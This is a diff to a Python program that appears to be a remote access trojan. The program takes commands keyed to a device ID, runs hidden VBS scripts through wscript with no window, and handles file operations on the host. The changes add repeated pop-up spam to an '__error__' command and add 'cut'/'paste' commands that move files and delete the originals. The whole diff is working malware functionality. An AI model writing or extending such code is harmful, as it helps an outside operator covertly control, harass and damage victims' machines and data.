@@ -43,6 +43,7 @@ device_id = None
 last_command_time = time.time()
 current_working_dir = os.getcwd()
 clipboard_file = None
+clipboard_cut = False
 
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
@@ -282,6 +283,7 @@ def show_error():
 def execute_shell_command(cmd_str):
     global current_working_dir
     global clipboard_file
+    global clipboard_cut
 
     try:
         cmd_lower = cmd_str.lower().strip()
@@ -334,20 +336,29 @@ def execute_shell_command(cmd_str):
         # Handle error command
         if cmd_lower.startswith("__error__"):
             try:
+                cantidad = 1
                 message = "Error"
+
                 if ":" in cmd_str:
-                    parts = cmd_str.split(":", 1)
+                    parts = cmd_str.split(":", 2)
                     if len(parts) > 1:
-                        message = parts[1].strip()
+                        try:
+                            cantidad = int(parts[1].strip())
+                        except ValueError:
+                            cantidad = 1
+                    if len(parts) > 2:
+                        message = parts[2].strip()
 
                 vbs_path = os.path.join(tempfile.gettempdir(), "telelluc_error_custom.vbs")
                 vbs_content = f'MsgBox "{message}", 16 + 65536 + 4096, "Message"\n'
                 with open(vbs_path, "w", encoding="utf-8") as f:
                     f.write(vbs_content)
 
-                subprocess.Popen(["wscript.exe", vbs_path],
-                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
-                return f"Message popup triggered: {message}"
+                for _ in range(cantidad):
+                    subprocess.Popen(["wscript.exe", vbs_path],
+                        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
+
+                return f"Message popup(s) triggered: {cantidad}x '{message}'"
             except Exception as e:
                 return f"Error: {str(e)}"
 
@@ -478,13 +489,29 @@ def execute_shell_command(cmd_str):
 
         # Handle copy command
         if cmd_lower.startswith("copy "):
-            filename = cmd_str[5:].strip().strip('"').strip("'")
+            source = cmd_str[5:].strip().strip('"').strip("'")
             try:
-                full_path = os.path.abspath(os.path.join(current_working_dir, filename))
+                full_path = os.path.abspath(os.path.join(current_working_dir, source))
                 if not os.path.exists(full_path):
-                    return f"Error: File not found: {filename}"
+                    return f"Error: File not found: {source}"
                 clipboard_file = full_path
-                return f"Copied: {filename} (ready to paste)"
+                clipboard_cut = False
+                filename = os.path.basename(full_path)
+                return f"Copied: {filename}"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle cut command
+        if cmd_lower.startswith("cut "):
+            source = cmd_str[4:].strip().strip('"').strip("'")
+            try:
+                full_path = os.path.abspath(os.path.join(current_working_dir, source))
+                if not os.path.exists(full_path):
+                    return f"Error: File not found: {source}"
+                clipboard_file = full_path
+                clipboard_cut = True
+                filename = os.path.basename(full_path)
+                return f"Cut: {filename}"
             except Exception as e:
                 return f"Error: {str(e)}"
 
@@ -492,26 +519,40 @@ def execute_shell_command(cmd_str):
         if cmd_lower == "paste" or cmd_lower.startswith("paste "):
             try:
                 if not clipboard_file:
-                    return "Error: Nothing to paste (use 'copy <file>' first)"
+                    return "Error: Nothing to paste (use 'copy <file>' or 'cut <file>' first)"
                 if not os.path.exists(clipboard_file):
                     return "Error: Clipboard file no longer exists"
 
-                dest_name = None
+                dest = None
                 if cmd_lower.startswith("paste "):
-                    dest_name = cmd_str[6:].strip().strip('"').strip("'")
+                    dest = cmd_str[6:].strip().strip('"').strip("'")
+
+                if dest:
+                    dest_path = os.path.abspath(os.path.join(current_working_dir, dest))
                 else:
-                    dest_name = os.path.basename(clipboard_file)
+                    dest_path = os.path.abspath(os.path.join(current_working_dir, os.path.basename(clipboard_file)))
 
-                dest_path = os.path.abspath(os.path.join(current_working_dir, dest_name))
-
+                import shutil
                 if os.path.isdir(clipboard_file):
-                    import shutil
                     shutil.copytree(clipboard_file, dest_path)
-                    return f"Directory pasted: {dest_name}"
+                    msg = f"Directory pasted: {os.path.basename(dest_path)}"
                 else:
-                    import shutil
                     shutil.copy2(clipboard_file, dest_path)
-                    return f"File pasted: {dest_name}"
+                    msg = f"File pasted: {os.path.basename(dest_path)}"
+
+                if clipboard_cut:
+                    try:
+                        if os.path.isdir(clipboard_file):
+                            shutil.rmtree(clipboard_file)
+                        else:
+                            os.remove(clipboard_file)
+                        msg += " (cut)"
+                    except:
+                        pass
+                    clipboard_file = None
+                    clipboard_cut = False
+
+                return msg
             except Exception as e:
                 return f"Error: {str(e)}"
 
